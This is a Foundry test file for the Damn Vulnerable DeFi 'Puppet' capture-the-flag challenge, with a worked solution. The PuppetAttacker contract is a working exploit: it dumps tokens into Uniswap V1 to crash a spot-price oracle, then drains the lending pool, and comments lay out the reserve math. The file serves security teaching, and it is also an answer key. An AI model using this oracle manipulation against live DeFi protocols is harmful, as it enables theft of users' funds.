// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract PuppetChallenge is Test {

    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE   = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE  = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE    = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE    = 100_000e18;

    DamnValuableToken    token;
    PuppetPool           lendingPool;
    IUniswapV1Exchange   uniswapV1Exchange;
    IUniswapV1Factory    uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * =========================================================
     * SOLUTION — test_puppet()
     * =========================================================
     * Attack: Uniswap V1 spot price oracle manipulation
     *
     * PuppetPool._computeOraclePrice() reads the raw ETH/DVT
     * balance ratio from the Uniswap V1 pair — a spot price
     * with zero manipulation resistance.
     *
     * 1. Deploy PuppetAttacker with all 25 ETH + transfer 1000 DVT
     * 2. Dump 1000 DVT into Uniswap V1 via tokenToEthTransferInput
     *    → reserves shift from 10 ETH/10 DVT to ~0.091 ETH/1010 DVT
     *    → _computeOraclePrice() crashes ~11,000x
     * 3. calculateDepositRequired(100_000 DVT) drops from 200,000 ETH
     *    to ~18 ETH — well within player's 25 ETH balance
     * 4. borrow(100_000 DVT) sends pool tokens directly to recovery
     *
     * 1-tx constraint (vm.getNonce == 1): all ops run through
     * PuppetAttacker constructor + single attack() call.
     * =========================================================
     */
    function test_puppet() public checkSolvedByPlayer {
        // Deploy attacker contract, forwarding all player ETH
        PuppetAttacker attacker = new PuppetAttacker{value: PLAYER_INITIAL_ETH_BALANCE}(
            token, lendingPool, uniswapV1Exchange, recovery
        );
        // Transfer all player DVT to the attacker
        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
        // Execute: dump tokens → crash oracle → borrow pool cheaply
        attacker.attack(POOL_INITIAL_TOKEN_BALANCE);
    }

    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private pure returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT — PuppetAttacker
 * =========================================================
 * Bundles the full attack into a single deployable contract
 * so all operations count as one player transaction.
 *
 * Receives player ETH + DVT, dumps DVT to crash the Uniswap
 * V1 spot price oracle, then borrows the full pool balance
 * at the manipulated (near-zero) collateral rate.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice Exploit contract for PuppetPool spot price oracle attack
 * @dev Dumps player DVT into Uniswap V1 to crash PuppetPool's oracle,
 *      then borrows all pool tokens at the deflated collateral rate.
 */
contract PuppetAttacker {

    DamnValuableToken  token;
    PuppetPool         lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address            recovery;

    /**
     * @param _token             DamnValuableToken contract
     * @param _lendingPool       PuppetPool to drain
     * @param _uniswapV1Exchange Uniswap V1 exchange used as oracle
     * @param _recovery          Destination for borrowed tokens
     */
    constructor(
        DamnValuableToken  _token,
        PuppetPool         _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address            _recovery
    ) payable {
        token             = _token;
        lendingPool       = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery          = _recovery;
    }

    /**
     * @notice Executes the full oracle manipulation and drain in one call
     * @dev Step 1: dump DVT → crashes _computeOraclePrice() from 1.0 to ~0.000091 ETH/DVT
     *      Step 2: borrow all pool tokens at the deflated collateral rate
     * @param borrowAmount Total DVT to borrow from the pool (= POOL_INITIAL_TOKEN_BALANCE)
     */
    function attack(uint256 borrowAmount) external {
        // Step 1: Dump all DVT into Uniswap V1
        // Before: 10 ETH / 10 DVT → price = 1.0 ETH per DVT
        // After:  ~0.091 ETH / ~1010 DVT → price ≈ 0.000091 ETH per DVT (~11,000x crash)
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));

        // Step 2: Borrow all 100,000 DVT — collateral now ~18 ETH (was 200,000 ETH)
        // PuppetPool.calculateDepositRequired = amount * (ethReserve/tokenReserve) * 2
        lendingPool.borrow{value: 20 ether}(borrowAmount, recovery);
    }

    receive() external payable {}
}
